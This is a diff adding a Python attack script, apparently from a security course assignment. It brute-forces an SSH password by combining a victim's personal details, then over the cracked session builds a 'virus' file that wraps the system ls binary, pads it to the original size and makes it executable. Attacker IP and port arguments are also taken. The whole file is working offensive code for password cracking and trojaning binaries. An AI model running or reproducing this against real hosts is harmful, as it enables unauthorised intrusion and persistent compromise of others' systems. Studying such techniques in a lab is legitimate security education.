@@ -1,0 +1,97 @@
+#!/usr/bin/env python3
+from itertools import combinations, permutations
+import paramiko
+import socket
+import time
+import sys
+
+def crack_ssh_passwd(victim_ip:str, username:str) -> paramiko.SSHClient:
+    '''
+    Cracking the victim’s password by launching a dictionary attack
+    Crack the SSH password of the victim based on the personal information
+    '''
+    # Read the victim's personal information
+    with open('./victim.dat', 'r') as info_file:
+        info = info_file.read().splitlines()
+    # Generate all possible combinations of the personal information
+    for i in range(1, len(info)+1):
+        for comb in combinations(info, i):
+            for perm in permutations(comb):
+                password = ''.join(perm)
+                crack_result = crack(victim_ip, username, password)
+                if crack_result:
+                    return crack_result
+                    
+            
+def crack(target_ip:str, user:str, password:str) -> paramiko.SSHClient:
+    '''
+    Utilize paramiko to build SSH connection with the client while catching exceptions
+    '''
+    print(f"[*] Trying: {user}:{password}")
+    try:
+        ssh_client = paramiko.SSHClient()
+        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh_client.connect(hostname=target_ip, username=user, password=password, timeout=15)
+        print(f"[+] Password Cracked: {user}:{password}")
+        return ssh_client
+    # Authentication failed
+    except paramiko.AuthenticationException:
+        print(f"[!] Authentication failed for {user}:{password}")
+        return None
+    # Other exceptions
+    except Exception as e:
+        print(f"[!] {e}. Retrying...")
+        time.sleep(1) # Sleep for 1 second before retrying
+        return crack(target_ip, user, password)
+    
+def infect_ls(client:paramiko.SSHClient, attacker_ip:str, attacker_port:str):
+    with open('virus.py', 'r') as f:
+        virus_content = f.read()
+
+    # Create a file named virus and write the virus content to it
+    _stdin, stdout, stderr = client.exec_command('echo "' + virus_content + '" > virus')
+    
+    _stdin, stdout, stderr = client.exec_command("which ls")
+    ls_path = stdout.read().decode().strip()
+    _stdin, stdout, stderr = client.exec_command(f"ls -l {ls_path} | awk '{{print $5}}'")
+    ls_size = stdout.read().decode().strip()
+    
+    _stdin, stdout, stderr = client.exec_command(f"""
+        zip -q new_ls {ls_path};
+        cat new_ls.zip >> virus;
+        ls -l new_ls.zip | awk '{{print $5}}'
+        rm -f new_ls.zip;
+    """)
+    
+    new_ls_size = stdout.read().decode().strip()
+    _stdin, stdout, stderr = client.exec_command("ls -l virus | awk '{print $5}'")
+    virus_size = stdout.read().decode().strip()
+    print(f"[*] ls size: {ls_size}")
+    print(f"[*] new_ls.zip size: {new_ls_size}")
+    print(f"[*] virus size: {virus_size}")
+    
+    padding_size = int(ls_size) - int(new_ls_size) - int(virus_size) - 8
+    
+    print(f"[*] Padding size: {padding_size}")
+
+    _stdin, stdout, stderr = client.exec_command('dd if=/dev/zero bs=' + str(padding_size) + ' count=1 >> virus;')
+    _stdin, stdout, stderr = client.exec_command("""
+        echo -n "aabbccdd" >> virus;
+        chmod +x virus;
+        """)
+    print(f"[*] Victim Infected !")
+    
+if __name__ == '__main__':
+    # If the arguments are not provided, print the usage
+    if len(sys.argv) != 4:
+        print(f"Usage: {sys.argv[0]} <victim_ip> <attacker_ip> <attacker_port>")
+        sys.exit(1)
+        
+    victim_ip = sys.argv[1]
+    attacker_ip = sys.argv[2]
+    attacker_port = sys.argv[3]
+
+    # task1
+    client = crack_ssh_passwd(victim_ip, 'csc2024')
+    # task 2 & 3
+    infect_ls(client, attacker_ip, attacker_port)
